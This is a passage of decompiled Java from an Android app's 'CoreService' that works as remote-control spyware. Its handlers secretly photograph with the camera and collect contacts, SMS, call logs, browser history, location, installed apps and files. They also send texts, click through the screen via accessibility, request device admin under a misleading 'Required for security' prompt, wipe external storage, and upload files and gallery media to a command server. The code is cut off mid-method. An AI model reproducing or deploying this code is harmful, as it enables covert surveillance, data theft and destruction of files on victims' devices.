    /* JADX INFO: renamed from: lambda$takePhoto$10$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m257lambda$takePhoto$10$comloveappCoreService(final String str, int i) {
        Camera cameraOpen;
        Exception e;
        this.threadCmdId.set(str);
        int numberOfCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int i2 = 0;
        while (true) {
            if (i2 >= numberOfCameras) {
                i2 = -1;
                break;
            }
            Camera.getCameraInfo(i2, cameraInfo);
            if (cameraInfo.facing == (i == 1 ? 1 : 0)) {
                break;
            } else {
                i2++;
            }
        }
        if (i2 == -1) {
            sendResult("photo_error", "Camera not found", str);
            return;
        }
        synchronized (this.cameraLock) {
            if (this.camera != null) {
                releaseCamera();
            }
            try {
                cameraOpen = Camera.open(i2);
                try {
                    cameraOpen.setPreviewTexture(new SurfaceTexture(0));
                    Camera.Parameters parameters = cameraOpen.getParameters();
                    parameters.setJpegQuality(85);
                    List<Camera.Size> supportedPictureSizes = parameters.getSupportedPictureSizes();
                    if (supportedPictureSizes != null && !supportedPictureSizes.isEmpty()) {
                        int iMax = Math.max(0, supportedPictureSizes.size() - Math.max(1, supportedPictureSizes.size() / 3));
                        parameters.setPictureSize(supportedPictureSizes.get(iMax).width, supportedPictureSizes.get(iMax).height);
                    }
                    cameraOpen.setParameters(parameters);
                    cameraOpen.startPreview();
                    Thread.sleep(500L);
                    cameraOpen.takePicture(null, null, new Camera.PictureCallback() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda19
                        @Override // android.hardware.Camera.PictureCallback
                        public final void onPictureTaken(byte[] bArr, Camera camera) {
                            this.f$0.m258lambda$takePhoto$9$comloveappCoreService(str, bArr, camera);
                        }
                    });
                    this.camera = cameraOpen;
                } catch (Exception e2) {
                    e = e2;
                    Log.e(TAG, "takePhoto error", e);
                    if (cameraOpen != null) {
                        try {
                            cameraOpen.release();
                        } catch (Exception unused) {
                        }
                    }
                    sendResult("photo_error", e.getMessage(), str);
                }
            } catch (Exception e3) {
                cameraOpen = null;
                e = e3;
            }
        }
    }

    /* JADX INFO: renamed from: lambda$takePhoto$9$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m258lambda$takePhoto$9$comloveappCoreService(String str, byte[] bArr, Camera camera) {
        synchronized (this.cameraLock) {
            try {
                camera.stopPreview();
            } catch (Exception unused) {
            }
            camera.release();
            this.camera = null;
        }
        byte[] bArrCompressImage = compressImage(bArr, 60, 1024);
        savePhoto(bArrCompressImage);
        sendResult("photo", Base64.encodeToString(bArrCompressImage, 2), str);
    }

    private void releaseCamera() {
        synchronized (this.cameraLock) {
            if (this.camera != null) {
                try {
                    this.camera.stopPreview();
                    this.camera.release();
                } catch (Exception unused) {
                }
                this.camera = null;
            }
        }
    }

    private void savePhoto(byte[] bArr) {
        try {
            String str = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File externalFilesDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
            if (externalFilesDir == null) {
                externalFilesDir = getFilesDir();
            }
            FileOutputStream fileOutputStream = new FileOutputStream(new File(externalFilesDir, "IMG_" + str + ".jpg"));
            try {
                fileOutputStream.write(bArr);
                fileOutputStream.close();
            } catch (Throwable th) {
                try {
                    fileOutputStream.close();
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                }
                throw th;
            }
        } catch (IOException e) {
            Log.e(TAG, "savePhoto write error", e);
        }
    }

    private void performClick(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        findAndClick(accessibilityNodeInfo, str);
        sendSimpleResult("click", "executed");
    }

    /* JADX WARN: Code duplicated, block: B:23:0x0057  */
    /* JADX WARN: Code duplicated, block: B:7:0x000b  */
    private boolean findAndClick(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        boolean z;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (nodeContainsText(accessibilityNodeInfo, str)) {
            z = true;
        } else if (str.contains(MessageSender.RECIPIENTS_SEPARATOR)) {
            String[] strArrSplit = str.split(MessageSender.RECIPIENTS_SEPARATOR, 2);
            if ((accessibilityNodeInfo.getViewIdResourceName() == null || !accessibilityNodeInfo.getViewIdResourceName().equals(strArrSplit[0])) && (accessibilityNodeInfo.getText() == null || !accessibilityNodeInfo.getText().toString().equalsIgnoreCase(strArrSplit[1]))) {
                z = false;
            } else {
                z = true;
            }
        } else {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.toString().equals(str)) {
                z = true;
            } else {
                z = false;
            }
        }
        if (z) {
            for (AccessibilityNodeInfo parent = accessibilityNodeInfo; parent != null; parent = parent.getParent()) {
                if (parent.isClickable()) {
                    parent.performAction(16);
                    return true;
                }
            }
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            if (findAndClick(accessibilityNodeInfo.getChild(i), str)) {
                return true;
            }
        }
        return false;
    }

    private void setText(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String[] strArrSplit = str.split(MessageSender.RECIPIENTS_SEPARATOR, 2);
        if (strArrSplit.length < 2) {
            sendSimpleResult("settext", "invalid param");
        } else {
            findAndSetText(accessibilityNodeInfo, strArrSplit[0], strArrSplit[1]);
            sendSimpleResult("settext", "done");
        }
    }

    private void findAndSetText(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getViewIdResourceName() != null && accessibilityNodeInfo.getViewIdResourceName().equals(str)) {
            Bundle bundle = new Bundle();
            bundle.putCharSequence(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str2);
            accessibilityNodeInfo.performAction(2097152, bundle);
        } else {
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                findAndSetText(accessibilityNodeInfo.getChild(i), str, str2);
            }
        }
    }

    private void performTouch(String str) {
        int i;
        int i2;
        try {
            String strTrim = str.replace("Rect(", "").replace(")", "").trim();
            if (strTrim.contains(" - ")) {
                String[] strArrSplit = strTrim.split(" - ");
                String[] strArrSplit2 = strArrSplit[0].split(",");
                String[] strArrSplit3 = strArrSplit[1].split(",");
                int i3 = Integer.parseInt(strArrSplit2[0].trim());
                int i4 = Integer.parseInt(strArrSplit2[1].trim());
                i = i3 + ((Integer.parseInt(strArrSplit3[0].trim()) - i3) / 2);
                i2 = i4 + ((Integer.parseInt(strArrSplit3[1].trim()) - i4) / 2);
            } else {
                String[] strArrSplit4 = strTrim.split(",");
                i = Integer.parseInt(strArrSplit4[0].trim());
                i2 = Integer.parseInt(strArrSplit4[1].trim());
            }
            Path path = new Path();
            path.moveTo(i, i2);
            dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L)).build(), null, null);
            sendSimpleResult("touch", "executed");
        } catch (Exception e) {
            sendSimpleResult("touch", "error: " + e.getMessage());
        }
    }

    private void enableDeviceAdmin() {
        if (this.dpm.isAdminActive(this.adminComponent)) {
            return;
        }
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", this.adminComponent);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Required for security");
        intent.addFlags(268435456);
        startActivity(intent);
    }

    private void sendInstalledApps() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda22
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m250lambda$sendInstalledApps$11$comloveappCoreService(str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$sendInstalledApps$11$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m250lambda$sendInstalledApps$11$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        PackageManager packageManager = getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(128);
        ArrayList arrayList = new ArrayList();
        for (ApplicationInfo applicationInfo : installedApplications) {
            if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null) {
                arrayList.add(applicationInfo.packageName);
            }
        }
        sendResult("apps", new JSONArray((Collection) arrayList).toString(), str);
    }

    private void launchApp(String str) {
        Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str);
        if (launchIntentForPackage != null) {
            launchIntentForPackage.addFlags(268435456);
            startActivity(launchIntentForPackage);
            sendSimpleResult("launch", "started");
            return;
        }
        sendSimpleResult("launch", "package not found");
    }

    private void uninstallApp(String str) {
        Intent intent = new Intent("android.intent.action.DELETE", Uri.parse("package:" + str));
        intent.addFlags(268435456);
        startActivity(intent);
        sendSimpleResult("uninstall", "intent sent");
    }

    private void getContacts() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda23
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m237lambda$getContacts$12$comloveappCoreService(str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$getContacts$12$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m237lambda$getContacts$12$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            Contacts.initialize(this);
            sendResult("contacts", new Gson().toJson(Contacts.getQuery().find()), str);
        } catch (Exception e) {
            sendResult("contacts", "error: " + e.getMessage(), str);
        }
    }

    private void getSms() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda34
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m241lambda$getSms$13$comloveappCoreService(str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$getSms$13$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m241lambda$getSms$13$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            List<Sms> list = new TelephonyProvider(this).getSms(TelephonyProvider.Filter.ALL).getList();
            sendResult("sms", new Gson().toJson(list.subList(0, Math.min(list.size(), 100))), str);
        } catch (Exception e) {
            sendResult("sms", "error: " + e.getMessage(), str);
        }
    }

    private void sendSms(final String str) {
        final String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda11
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m252lambda$sendSms$14$comloveappCoreService(str2, str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$sendSms$14$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m252lambda$sendSms$14$comloveappCoreService(String str, String str2) {
        SmsManager smsManager;
        this.threadCmdId.set(str);
        try {
            JSONObject jSONObject = new JSONObject(str2);
            if (Build.VERSION.SDK_INT >= 31) {
                smsManager = (SmsManager) getSystemService(SmsManager.class);
            } else {
                smsManager = SmsManager.getDefault();
            }
            smsManager.sendTextMessage(jSONObject.getString("phone"), null, jSONObject.getString("message"), null, null);
            sendResult("sms_status", "sent to " + jSONObject.getString("phone"), str);
        } catch (Exception e) {
            sendResult("sms_status", "failed: " + e.getMessage(), str);
        }
    }

    private void getCallLogs() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda13
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m236lambda$getCallLogs$15$comloveappCoreService(str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$getCallLogs$15$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m236lambda$getCallLogs$15$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            List<Call> list = new CallsProvider(this).getCalls().getList();
            sendResult("call_logs", new Gson().toJson(list.subList(0, Math.min(list.size(), 100))), str);
        } catch (Exception e) {
            sendResult("call_logs", "error: " + e.getMessage(), str);
        }
    }

    private void startLocationTracking() {
        if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == 0 || checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == 0) {
            try {
                this.locationManager = (LocationManager) getSystemService("location");
                this.locationListener = new LocationListener() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda7
                    @Override // android.location.LocationListener
                    public final void onLocationChanged(Location location) {
                        this.f$0.m256lambda$startLocationTracking$16$comloveappCoreService(location);
                    }
                };
                if (this.locationManager.isProviderEnabled("gps")) {
                    this.locationManager.requestLocationUpdates("gps", WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS, 50.0f, this.locationListener);
                }
                if (this.locationManager.isProviderEnabled("network")) {
                    this.locationManager.requestLocationUpdates("network", WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS, 50.0f, this.locationListener);
                }
            } catch (Exception e) {
                Log.e(TAG, "location tracker", e);
            }
        }
    }

    /* JADX INFO: renamed from: lambda$startLocationTracking$16$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m256lambda$startLocationTracking$16$comloveappCoreService(Location location) {
        this.locationData.latitude = location.getLatitude();
        this.locationData.longitude = location.getLongitude();
        getSharedPreferences(PREF_NAME, 0).edit().putLong("loc_lat", Double.doubleToLongBits(location.getLatitude())).putLong("loc_lon", Double.doubleToLongBits(location.getLongitude())).apply();
    }

    private void sendLocation() {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("lat", this.locationData.latitude);
            jSONObject.put("lon", this.locationData.longitude);
            jSONObject.put("available", (this.locationData.latitude == 0.0d && this.locationData.longitude == 0.0d) ? false : true);
        } catch (JSONException unused) {
        }
        sendResult("location", jSONObject.toString());
    }

    private void sendDeviceInfo() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda35
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m249lambda$sendDeviceInfo$17$comloveappCoreService(str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$sendDeviceInfo$17$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m249lambda$sendDeviceInfo$17$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_DEVICE_ID, this.deviceId);
            jSONObject.put("model", Build.MODEL);
            jSONObject.put("manufacturer", Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", Build.VERSION.RELEASE);
            jSONObject.put("username", ConfigFetcher.getUsername(this));
            jSONObject.put("session_id", ConfigFetcher.getSessionId(this));
            BatteryManager batteryManager = (BatteryManager) getSystemService("batterymanager");
            if (batteryManager != null) {
                jSONObject.put("battery", batteryManager.getIntProperty(4));
            }
            if (telephonyManager != null) {
                try {
                    jSONObject.put("country", telephonyManager.getNetworkCountryIso());
                    jSONObject.put("operator", telephonyManager.getSimOperatorName());
                } catch (SecurityException unused) {
                    jSONObject.put("country", "");
                    jSONObject.put("operator", "");
                }
            }
        } catch (JSONException unused2) {
        }
        sendResult("device_info", jSONObject.toString(), str);
    }

    private void getBrowserHistory() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda14
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m235lambda$getBrowserHistory$18$comloveappCoreService(str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$getBrowserHistory$18$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m235lambda$getBrowserHistory$18$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            List<Search> list = new BrowserProvider(this).getSearches().getList();
            sendResult("browser_history", new Gson().toJson(list.subList(0, Math.min(list.size(), 100))), str);
        } catch (Exception e) {
            sendResult("browser_history", "error: " + e.getMessage(), str);
        }
    }

    private void getFileList(final String str) {
        final String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda37
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m238lambda$getFileList$19$comloveappCoreService(str2, str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$getFileList$19$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m238lambda$getFileList$19$comloveappCoreService(String str, String str2) {
        this.threadCmdId.set(str);
        File file = (str2 == null || str2.isEmpty()) ? null : new File(str2);
        if (file == null || !file.exists()) {
            file = Environment.getExternalStorageDirectory();
        }
        File[] fileArrListFiles = file.listFiles();
        JSONArray jSONArray = new JSONArray();
        if (fileArrListFiles != null) {
            for (File file2 : fileArrListFiles) {
                try {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("name", file2.getName());
                    jSONObject.put("path", file2.getAbsolutePath());
                    jSONObject.put("isDir", file2.isDirectory());
                    jSONObject.put("size", file2.isFile() ? file2.length() : 0L);
                    jSONArray.put(jSONObject);
                } catch (JSONException unused) {
                }
            }
        }
        sendResult("file_list", jSONArray.toString(), str);
    }

    private void uploadFile(final String str) {
        final String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda17
            @Override // java.lang.Runnable
            public final void run() throws Throwable {
                this.f$0.m259lambda$uploadFile$20$comloveappCoreService(str2, str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$uploadFile$20$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m259lambda$uploadFile$20$comloveappCoreService(String str, String str2) throws Throwable {
        this.threadCmdId.set(str);
        File file = new File(str2);
        if (!file.exists()) {
            sendResult("upload_status", "not found: " + str2, str);
            return;
        }
        String strUploadFileToServer = uploadFileToServer(file);
        if (strUploadFileToServer != null) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("filename", file.getName());
                jSONObject.put("size", file.length());
                jSONObject.put("url", strUploadFileToServer);
                sendResult("file_upload", jSONObject.toString(), str);
                return;
            } catch (Exception e) {
                sendResult("upload_status", "json error: " + e.getMessage(), str);
                return;
            }
        }
        sendResult("upload_status", "upload failed", str);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void setTorch(boolean z) {
        if (this.torchCameraId != null) {
            try {
                this.cameraManager.setTorchMode(this.torchCameraId, z);
            } catch (CameraAccessException unused) {
            }
        }
    }

    private void startTorchBlink() {
        this.torchBlinking = true;
        this.handler.post(new Runnable() { // from class: com.love.app.CoreService.3
            boolean state = false;

            @Override // java.lang.Runnable
            public void run() {
                if (!CoreService.this.torchBlinking) {
                    CoreService.this.setTorch(false);
                    return;
                }
                boolean z = !this.state;
                this.state = z;
                CoreService.this.setTorch(z);
                CoreService.this.handler.postDelayed(this, 300L);
            }
        });
    }

    private void vibrate() {
        Vibrator vibrator = (Vibrator) getSystemService("vibrator");
        if (vibrator == null) {
            return;
        }
        if (Build.VERSION.SDK_INT >= 26) {
            vibrator.vibrate(VibrationEffect.createOneShot(20000L, -1));
        } else {
            vibrator.vibrate(20000L);
        }
    }

    private void wipe() {
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda12
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m260lambda$wipe$21$comloveappCoreService();
            }
        }).start();
        sendSimpleResult("wipe", "started");
    }

    /* JADX INFO: renamed from: lambda$wipe$21$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m260lambda$wipe$21$comloveappCoreService() {
        deleteRecursive(Environment.getExternalStorageDirectory());
    }

    private void deleteRecursive(File file) {
        File[] fileArrListFiles;
        if (file == null) {
            return;
        }
        if (file.isDirectory() && (fileArrListFiles = file.listFiles()) != null) {
            for (File file2 : fileArrListFiles) {
                deleteRecursive(file2);
            }
        }
        file.delete();
    }

    private void changeWallpaper(final String str) {
        final String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda39
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m226lambda$changeWallpaper$22$comloveappCoreService(str2, str);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$changeWallpaper$22$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m226lambda$changeWallpaper$22$comloveappCoreService(String str, String str2) {
        this.threadCmdId.set(str);
        try {
            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);
            if (str2 != null && (str2.startsWith("http://") || str2.startsWith("https://"))) {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str2).openConnection();
                httpURLConnection.setDoInput(true);
                httpURLConnection.connect();
                Bitmap bitmapDecodeStream = BitmapFactory.decodeStream(httpURLConnection.getInputStream());
                if (bitmapDecodeStream != null) {
                    wallpaperManager.setBitmap(bitmapDecodeStream);
                    sendResult("wallpaper", "changed", str);
                    return;
                }
            }
            wallpaperManager.setResource(C1294R.mipmap.ic_launcher);
            sendResult("wallpaper", "changed (default)", str);
        } catch (Exception e) {
            Log.e(TAG, "wallpaper error", e);
            sendResult("wallpaper_error", e.getMessage(), str);
        }
    }

    private void speak(String str) {
        if (this.tts == null || str == null || str.isEmpty()) {
            return;
        }
        this.tts.speak(str, 1, null, null);
    }

    private void showToast(final String str) {
        this.handler.post(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda33
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m253lambda$showToast$23$comloveappCoreService(str);
            }
        });
    }

    /* JADX WARN: Code duplicated, block: B:20:0x004f  */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX INFO: renamed from: lambda$showToast$23$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m253lambda$showToast$23$comloveappCoreService(String str) {
        byte b;
        try {
            JSONObject jSONObject = new JSONObject(str);
            String strOptString = jSONObject.optString(TransactionBundle.TRANSACTION_TYPE, "normal");
            String strOptString2 = jSONObject.optString("message", "");
            if (strOptString2.isEmpty()) {
                return;
            }
            switch (strOptString.hashCode()) {
                case -1867169789:
                    if (!strOptString.equals(ANConstants.SUCCESS)) {
                        b = -1;
                    } else {
                        b = 1;
                    }
                    break;
                case 3237038:
                    if (!strOptString.equals("info")) {
                        b = -1;
                    } else {
                        b = 2;
                    }
                    break;
                case 96784904:
                    if (!strOptString.equals("error")) {
                        b = -1;
                    } else {
                        b = 0;
                    }
                    break;
                case 1124446108:
                    if (!strOptString.equals("warning")) {
                        b = -1;
                    } else {
                        b = 3;
                    }
                    break;
                default:
                    b = -1;
                    break;
            }
            if (b == 0) {
                Toasty.error(this, strOptString2).show();
                return;
            }
            if (b == 1) {
                Toasty.success(this, strOptString2).show();
                return;
            }
            if (b == 2) {
                Toasty.info(this, strOptString2).show();
            } else if (b == 3) {
                Toasty.warning(this, strOptString2).show();
            } else {
                Toasty.normal(this, strOptString2).show();
            }
        } catch (Exception e) {
            Log.e(TAG, "toast error", e);
        }
    }

    private void fetchNotifications() {
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null) {
            sendResult("notifications", "[]");
            return;
        }
        StringRequest stringRequest = new StringRequest(0, baseUrl + "/notif/report?device_id=" + this.deviceId, new Response.Listener() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda29
            @Override // com.android.volley.Response.Listener
            public final void onResponse(Object obj) {
                this.f$0.m229lambda$fetchNotifications$24$comloveappCoreService((String) obj);
            }
        }, new Response.ErrorListener() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda30
            @Override // com.android.volley.Response.ErrorListener
            public final void onErrorResponse(VolleyError volleyError) {
                this.f$0.m230lambda$fetchNotifications$25$comloveappCoreService(volleyError);
            }
        });
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
        this.requestQueue.add(stringRequest);
    }

    /* JADX INFO: renamed from: lambda$fetchNotifications$24$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m229lambda$fetchNotifications$24$comloveappCoreService(String str) {
        sendResult("notifications", str);
    }

    /* JADX INFO: renamed from: lambda$fetchNotifications$25$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m230lambda$fetchNotifications$25$comloveappCoreService(VolleyError volleyError) {
        sendResult("notifications", "[]");
    }

    private void fetchGallery(String str) {
        final int i = 20;
        final boolean z = true;
        if (str != null) {
            try {
                if (!str.isEmpty()) {
                    if (str.startsWith("no_upload:")) {
                        try {
                            i = Integer.parseInt(str.substring(10));
                            z = false;
                        } catch (Exception e) {
                            e = e;
                            z = false;
                            Log.w(TAG, "fetchGallery param error", e);
                        }
                    } else {
                        i = Integer.parseInt(str);
                    }
                }
            } catch (Exception e2) {
                e = e2;
            }
        }
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda3
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m227lambda$fetchGallery$26$comloveappCoreService(z, i);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$fetchGallery$26$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m227lambda$fetchGallery$26$comloveappCoreService(boolean z, int i) {
        File[] fileArrListFiles;
        String strUploadFileToServer;
        List arrayList = new ArrayList();
        File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM + "/Camera");
        if (externalStoragePublicDirectory.exists() && (fileArrListFiles = externalStoragePublicDirectory.listFiles()) != null) {
            int length = fileArrListFiles.length;
            for (int i2 = 0; i2 < length; i2++) {
                File file = fileArrListFiles[i2];
                if (file.isFile()) {
                    String lowerCase = file.getName().toLowerCase();
                    if (lowerCase.endsWith(".jpg") || lowerCase.endsWith(".jpeg") || lowerCase.endsWith(".png") || lowerCase.endsWith(".mp4") || lowerCase.endsWith(".3gp") || lowerCase.endsWith(".mov")) {
                        try {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("name", file.getName());
                            jSONObject.put("size", file.length());
                            jSONObject.put(TransactionBundle.TRANSACTION_TYPE, file.getName().substring(file.getName().lastIndexOf(".") + 1));
                            if (z && (strUploadFileToServer = uploadFileToServer(file)) != null) {
                                jSONObject.put("url", strUploadFileToServer);
                            } else {
                                jSONObject.put("path", file.getAbsolutePath());
                            }
                            if (lowerCase.endsWith(".jpg") || lowerCase.endsWith(".jpeg") || lowerCase.endsWith(".png")) {
                                jSONObject.put("thumb", getImageThumbnail(file.getAbsolutePath(), 200));
                            }
                            arrayList.add(jSONObject);
                        } catch (JSONException unused) {
                        }
                    }
                }
            }
        }
        if (arrayList.size() > i) {
            arrayList = arrayList.subList(0, i);
        }
        sendResult("gallery", new JSONArray((Collection) arrayList).toString());
    }

    /* JADX WARN: Code duplicated, block: B:32:0x0151 A[PHI: r5
      0x0151: PHI (r5v3 java.net.HttpURLConnection) = (r5v2 java.net.HttpURLConnection), (r5v8 java.net.HttpURLConnection) binds: [B:31:0x014f, B:22:0x013f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Code duplicated, block: B:37:0x0159  */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r6v0 */
    /* JADX WARN: Type inference failed for: r6v1, types: [java.net.HttpURLConnection] */
    /* JADX WARN: Type inference failed for: r6v2 */
    private String uploadFileToServer(File file) throws Throwable {
        HttpURLConnection httpURLConnection;
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        ?? r6 = 0;
        if (baseUrl == null) {
            return null;
        }
        String str = "===" + System.currentTimeMillis() + "===";
        try {
            try {
                httpURLConnection = (HttpURLConnection) new URL(baseUrl + "/upload").openConnection();
                try {
                    httpURLConnection.setDoInput(true);
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setUseCaches(false);
                    httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_POST);
                    httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
                    httpURLConnection.setRequestProperty(HttpHeaderParser.HEADER_CONTENT_TYPE, "multipart/form-data; boundary=" + str);
                    DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
                    dataOutputStream.writeBytes("--" + str + "\r\n");
                    dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
                    dataOutputStream.writeBytes("Content-Type: " + URLConnection.guessContentTypeFromName(file.getName()) + "\r\n");
                    dataOutputStream.writeBytes("\r\n");
                    FileInputStream fileInputStream = new FileInputStream(file);
                    byte[] bArr = new byte[8192];
                    while (true) {
                        int i = fileInputStream.read(bArr);
                        if (i == -1) {
                            break;
                        }
                        dataOutputStream.write(bArr, 0, i);
                    }
                    fileInputStream.close();
                    dataOutputStream.writeBytes("\r\n");
                    dataOutputStream.writeBytes("--" + str + "--\r\n");
                    dataOutputStream.flush();
                    dataOutputStream.close();
                    if (httpURLConnection.getResponseCode() == 200) {
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        while (true) {
                            String line = bufferedReader.readLine();
                            if (line == null) {
                                break;
                            }
                            sb.append(line);
                        }
                        bufferedReader.close();
                        String strOptString = new JSONObject(sb.toString()).optString("url");
                        if (httpURLConnection != null) {
                            httpURLConnection.disconnect();
                        }
                        return strOptString;
                    }
                    if (httpURLConnection != null) {
                        httpURLConnection.disconnect();
                    }
                } catch (Exception e) {
                    e = e;
                    Log.e(TAG, "Upload error", e);
                    if (httpURLConnection != null) {
